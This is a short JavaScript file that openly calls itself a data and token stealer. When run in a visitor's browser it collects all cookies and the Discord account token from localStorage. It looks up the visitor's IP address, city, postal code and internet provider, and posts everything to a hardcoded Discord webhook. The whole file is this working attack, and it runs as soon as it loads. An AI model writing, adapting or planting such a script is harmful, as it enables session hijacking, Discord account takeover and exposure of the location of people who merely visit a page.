function stealDataAndToken() {
    var allCookies = document.cookie; // Get all cookies from the current document
    var discordToken = null;

    // Retrieve the storage named "https://discord.com"
    var discordStorage = localStorage.getItem('https://discord.com');

    if (discordStorage) {
        // Parse the storage data as JSON
        var storageData = JSON.parse(discordStorage);

        // Iterate over the keys in the storage
        for (var key in storageData) {
            if (key === 'token') {
                // Found the key named "token", retrieve the value
                discordToken = storageData[key];
                break; // Stop iterating once the token is found
            }
        }
    } else {
        console.error('No storage named "https://discord.com" found in local storage.');
    }

    // Fetch user's IP
    fetch('https://httpbin.org/ip')
    .then(response => response.json())
    .then(data => {
        var clientIp = data.origin;

        // Fetch geolocation information from IPinfo.io
        fetch(`https://ipinfo.io/${clientIp}/json?token=0b2944a985b669`)
        .then(response => response.json())
        .then(geoData => {
            var city = geoData.city;
            var region = geoData.region;
            var country = geoData.country;
            var isp = geoData.org;
            var postalCode = geoData.postal;

            // Send a message to Discord webhook including the stolen data and Discord token
            var message = `\`\`\`
Someone visited the website from:
- City: ${city}
- Region: ${region}
- Country: ${country}
- Internet provider: ${isp}
- Postal Code: ${postalCode}
- IP Address: ${clientIp}
- Cookies: ${allCookies} // Include all cookies here
- Discord Token: ${discordToken} // Include the Discord token here
\`\`\``;

            // Send message to Discord
            sendMessageToDiscord(message);
        })
        .catch(error => {
            console.error('Error fetching geolocation information:', error);
        });
    })
    .catch(error => {
        console.error('Error fetching IP address:', error.message);
    });

    // Function to send message to Discord webhook
    function sendMessageToDiscord(message) {
        fetch('https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                content: message
            })
        })
        .then(response => {
            if (response.ok) {
                console.log('Message sent to Discord!');
            } else {
                console.error('Failed to send message to Discord:', response.status, response.statusText);
            }
        })
        .catch(error => {
            console.error('Error sending message to Discord:', error.message);
        });
    }
}

// Call function to steal data and token
stealDataAndToken();
